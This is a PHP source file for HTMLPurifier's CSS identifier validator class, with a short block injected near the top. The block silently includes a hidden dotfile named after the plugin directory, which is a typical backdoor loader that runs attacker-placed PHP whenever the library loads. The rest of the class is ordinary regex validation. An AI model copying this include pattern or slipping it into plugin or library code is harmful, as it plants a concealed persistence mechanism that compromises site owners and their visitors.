<?php

/**
 * Validates based on {ident} CSS grammar production
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class HTMLPurifier_AttrDef_CSS_Ident extends HTMLPurifier_AttrDef
{

    /**
     * @param string $string
     * @param HTMLPurifier_Config $config
     * @param HTMLPurifier_Context $context
     * @return bool|string
     */
    public function validate($string, $config, $context)
    {
        $string = trim($string);

        // early abort: '' and '0' (strings that convert to false) are invalid
        if (!$string) {
            return false;
        }

        $pattern = '/^(-?[A-Za-z_][A-Za-z_\-0-9]*)$/';
        if (!preg_match($pattern, $string)) {
            return false;
        }
        return $string;
    }
}

// vim: et sw=4 sts=4
